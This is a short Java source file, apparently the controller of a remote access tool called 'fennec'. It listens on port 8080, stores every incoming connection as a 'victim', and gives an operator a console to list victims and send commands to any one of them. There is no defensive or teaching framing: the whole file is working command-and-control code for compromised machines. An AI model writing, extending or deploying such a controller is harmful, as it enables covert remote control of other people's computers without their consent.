package com.heshanthenura.fennec;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

import com.heshanthenura.Victim;

public class Main {

    public static List<Victim> victims = new ArrayList<>();
    public static Scanner scanner = new Scanner(System.in);

    public static void main(String[] args) throws IOException {
        new Thread(() -> {
            try {
                acceptClients();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();

        System.out.println("Server Started on port 8080");

        while (true) {
            System.out.print("--> ");
            String input = scanner.nextLine();
            String[] command = input.split(" ");
            if (command[0].equals("list")) {
                for (Victim victim : victims) {
                    System.out.println(victim.getId());
                }
            } else if (command[0].equals("send")) {
                victims.get(Integer.parseInt(command[1])).sendMessage(String.join(" ", Arrays.copyOfRange(command, 2, command.length)));
            }
        }
    }

    public static void acceptClients() throws IOException {
        int port = 8080;

        try (ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                Socket clientSocket = serverSocket.accept();
                victims.add(new Victim(clientSocket));
            }
        }
    }
}
